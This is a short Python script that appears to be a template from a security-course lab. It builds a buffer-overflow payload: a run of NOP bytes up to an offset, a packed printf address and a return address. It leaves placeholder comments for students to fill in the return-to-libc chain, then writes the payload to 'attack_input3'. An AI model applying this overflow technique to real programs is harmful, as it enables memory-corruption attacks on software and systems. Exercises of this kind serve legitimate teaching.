import sys
import struct

offset = 0x88 # modify it
printf_addr = 0xb7e887e0 # modify it
buf_addr =  0x0 # modify it
ret = 0xb7e56260
## Put the  construct buf below
buf = (offset)*'\x90'
buf += struct.pack('<I', printf_addr)
### please fill the buf chains below
## such as buf += struct.pack('<I', whatever_value)
## hints. arguments of printf function


### end



file = open('attack_input3', 'wb')
file.write("3\n")
file.write(buf)
file.close()
